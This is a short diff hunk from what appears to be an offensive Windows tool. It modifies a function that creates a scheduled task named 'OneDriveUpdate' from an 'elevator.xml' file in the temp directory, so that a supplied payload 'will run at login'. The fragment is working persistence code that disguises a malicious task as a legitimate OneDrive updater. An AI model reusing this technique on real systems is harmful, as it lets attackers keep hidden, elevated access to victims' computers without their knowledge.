@@ -77,8 +77,8 @@ def schtask(payload):
 			time.sleep(5)
 		
 			if os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True:
-				if process().create("schtasks /create /xml {} /tn OneDriveUpdate".format(
-						os.path.join(tempfile.gettempdir(), "elevator.xml")), 0):
+				if process().create("schtasks.exe", params="/create /xml {} /tn OneDriveUpdate".format(
+						os.path.join(tempfile.gettempdir(), "elevator.xml"))):
 					print_success("Successfully created scheduled task, payload will run at login")
 				else:
 					print_error("Unable to create scheduled task")	
